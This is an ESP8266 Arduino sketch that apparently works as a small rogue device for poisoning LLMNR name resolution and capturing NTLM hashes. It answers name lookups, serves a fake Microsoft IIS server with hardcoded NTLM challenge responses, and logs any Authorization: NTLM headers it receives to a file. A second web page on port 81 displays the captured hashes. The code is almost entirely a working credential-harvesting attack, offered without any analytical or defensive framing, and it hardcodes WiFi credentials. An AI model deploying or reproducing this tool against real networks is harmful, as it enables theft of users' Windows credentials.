#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <WiFiClient.h>
#include "FS.h"
#include <ESP8266LLMNR.h> // this is an edited version of the official arduino ESP8266LLMNR library

const char* ssid = "Larisa";
const char* password = "werewalkinghere";

WiFiServer server(80);
WiFiClient client;
ESP8266WebServer web_server(81);

/* The NTLM server responses:
  answer1 =
  HTTP/1.1 401 Unauthorized
  Server: Microsoft-IIS/6.0
  Date: Wed, 12 Sep 2012 13:06:55 GMT
  Content-Type: text/html
  WWW-Authenticate: NTLM
  X-Powered-By: ASP.NET
  Content-Length: 0
  
  answer2 =
  HTTP/1.1 401 Unauthorized
  Server: Microsoft-IIS/6.0
  Date: Wed, 12 Sep 2012 13:06:55 GMT
  Content-Type: text/html
  WWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiABEiM0RVZncAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==
  X-Powered-By: ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET
  Content-Length: 0
*/
byte answer1_array[] = {72, 84, 84, 80, 47, 49, 46, 49, 32, 52, 48, 49, 32, 85, 110, 97, 117, 116, 104, 111, 114, 105, 122, 101, 100, 13, 10, 83, 101, 114, 118, 101, 114, 58, 32, 77, 105, 99, 114, 111, 115, 111, 102, 116, 45, 73, 73, 83, 47, 54, 46, 48, 13, 10, 68, 97, 116, 101, 58, 32, 87, 101, 100, 44, 32, 49, 50, 32, 83, 101, 112, 32, 50, 48, 49, 50, 32, 49, 51, 58, 48, 54, 58, 53, 53, 32, 71, 77, 84, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101, 58, 32, 116, 101, 120, 116, 47, 104, 116, 109, 108, 13, 10, 87, 87, 87, 45, 65, 117, 116, 104, 101, 110, 116, 105, 99, 97, 116, 101, 58, 32, 78, 84, 76, 77, 13, 10, 88, 45, 80, 111, 119, 101, 114, 101, 100, 45, 66, 121, 58, 32, 65, 83, 80, 46, 78, 69, 84, 13, 10, 67, 111, 110, 116, 101, 110, 116, 45, 76, 101, 110, 103, 116, 104, 58, 32, 48, 13, 10, 13, 10};
byte answer2_array[] = {72, 84, 84, 80, 47, 49, 46, 49, 32, 52, 48, 49, 32, 85, 110, 97, 117, 116, 104, 111, 114, 105, 122, 101, 100, 10, 83, 101, 114, 118, 101, 114, 58, 32, 77, 105, 99, 114, 111, 115, 111, 102, 116, 45, 73, 73, 83, 47, 54, 46, 48, 10, 68, 97, 116, 101, 58, 32, 87, 101, 100, 44, 32, 49, 50, 32, 83, 101, 112, 32, 50, 48, 49, 50, 32, 49, 51, 58, 48, 54, 58, 53, 53, 32, 71, 77, 84, 10, 67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101, 58, 32, 116, 101, 120, 116, 47, 104, 116, 109, 108, 10, 87, 87, 87, 45, 65, 117, 116, 104, 101, 110, 116, 105, 99, 97, 116, 101, 58, 32, 78, 84, 76, 77, 32, 84, 108, 82, 77, 84, 86, 78, 84, 85, 65, 65, 67, 65, 65, 65, 65, 66, 103, 65, 71, 65, 68, 103, 65, 65, 65, 65, 70, 65, 111, 109, 105, 65, 66, 69, 105, 77, 48, 82, 86, 90, 110, 99, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 73, 65, 65, 103, 65, 65, 43, 65, 65, 65, 65, 66, 81, 76, 79, 68, 103, 65, 65, 65, 65, 57, 84, 65, 69, 48, 65, 81, 103, 65, 67, 65, 65, 89, 65, 85, 119, 66, 78, 65, 69, 73, 65, 65, 81, 65, 87, 65, 70, 77, 65, 84, 81, 66, 67, 65, 67, 48, 65, 86, 65, 66, 80, 65, 69, 56, 65, 84, 65, 66, 76, 65, 69, 107, 65, 86, 65, 65, 69, 65, 66, 73, 65, 99, 119, 66, 116, 65, 71, 73, 65, 76, 103, 66, 115, 65, 71, 56, 65, 89, 119, 66, 104, 65, 71, 119, 65, 65, 119, 65, 111, 65, 72, 77, 65, 90, 81, 66, 121, 65, 72, 89, 65, 90, 81, 66, 121, 65, 68, 73, 65, 77, 65, 65, 119, 65, 68, 77, 65, 76, 103, 66, 122, 65, 71, 48, 65, 89, 103, 65, 117, 65, 71, 119, 65, 98, 119, 66, 106, 65, 71, 69, 65, 98, 65, 65, 70, 65, 66, 73, 65, 99, 119, 66, 116, 65, 71, 73, 65, 76, 103, 66, 115, 65, 71, 56, 65, 89, 119, 66, 104, 65, 71, 119, 65, 65, 65, 65, 65, 65, 65, 61, 61, 10, 88, 45, 80, 111, 119, 101, 114, 101, 100, 45, 66, 121, 58, 32, 65, 83, 80, 46, 78, 67, 48, 67, 68, 55, 66, 55, 56, 48, 50, 67, 55, 54, 55, 51, 54, 69, 57, 66, 50, 54, 70, 66, 49, 57, 66, 69, 66, 50, 68, 51, 54, 50, 57, 48, 66, 57, 70, 70, 57, 65, 52, 54, 69, 68, 68, 65, 53, 69, 84, 10, 67, 111, 110, 116, 101, 110, 116, 45, 76, 101, 110, 103, 116, 104, 58, 32, 48};

String answer1 = "";
String answer2 = "";

void initialize() {
  for (int i = 0; i < sizeof(answer1_array); i++) {
    answer1 += (char)answer1_array[i];
  }
  for (int i = 0; i < sizeof(answer2_array); i++) {
    answer2 += (char)answer2_array[i];
  }
}

void deleteAndCreateFile(String path) {
  SPIFFS.remove(path);
  File f = SPIFFS.open("/creds.txt", "w+");
  f.close();
}

String getCreds() {
  String ret = "";
  ret += "<script>";
  if (SPIFFS.exists("/creds.txt") && SPIFFS.exists("/parse_ntlm.js")) {
    File f = SPIFFS.open("/creds.txt", "r");
    String jsCode = getFileContents("/parse_ntlm.js");
    ret += jsCode;
    String s;
    while (f.position() < f.size())
    {
      s = f.readStringUntil('\n');
      if (s.startsWith("Authorization: NTLM")) {
        s.replace("Authorization: NTLM", "document.write(ParseNTLMHash('");
        s.replace("\n", "");
        s.replace("\r", "");
        s.replace(" ", "");
        s = s + "') + \"<br>\");\n";
        ret = ret + s;
      }
      s.trim();
    }
    f.close();
  } else {
    return "creds not found";
  }

  if (ret.length() == 0) {
    return "creds file empty";
  } else {
    ret = ret + "</script>";
    return ret;
  }
}

String getFileContents(String path) {
  String ret = "";
  if (SPIFFS.exists(path)) {
    File f = SPIFFS.open(path, "r");
    String s;
    while (f.position() < f.size()){
      s = f.readStringUntil('\n');
      ret = ret + s + '\n';
      s.trim();
    }
    f.close();
  } else {
    return "file not found";
  }

  if (ret.length() == 0) {
    return "file empty";
  } else {
    return ret;
  }
}

void setup()
{
  Serial.begin(115200);
  SPIFFS.begin();

  // Connect to WiFi network
  WiFi.begin(ssid, password);
  Serial.println("");

  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("");
  Serial.print("Connected to ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  
  // Start LLMNR responder
  LLMNR.begin("");
  Serial.println("LLMNR responder started");

  // Start HTTP server
  server.begin();
  Serial.println("HTTP server started");
  initialize();

  // Start the admin page server
  web_server.begin();
  web_server.on("/esp8266", []() {
    web_server.send(200, "text/html", getFileContents("/admin.html") + getCreds());
  });

  web_server.on("/deleteall", []() {
    deleteAndCreateFile("/creds.txt");
    String creds = getFileContents("/creds.txt");
    web_server.send(200, "text/html", getFileContents("/admin.html") + getCreds());
  });

}
void loop()
{
  web_server.handleClient();
  if (!client.connected()) {
    // try to connect to a new client
    client = server.available();
  } else {
    // read data from the connected client
    String data = "";
    while (client.available() > 0) {
      char currentChar = client.read();
      data += currentChar;
    }
    if (data.length() > 0) {
      client.print(answer1);

      if (data.indexOf("Authorization: NTLM") != -1) {
        Serial.println("Hash: ");
        Serial.println(data);

        if (SPIFFS.exists("/creds.txt")) {
          File f = SPIFFS.open("/creds.txt", "a");
          f.println(data);
          f.close();
        }
        client.stop();
      } else {
        data = "";
        while (client.available() > 0) {
          char currentChar = client.read();
          data += currentChar;
        }
        if (data.length() > 0) {
          client.print(answer2);
          if (data.length() > 0) {
            client.stop();
          }
        }
      }
    }
  }
}


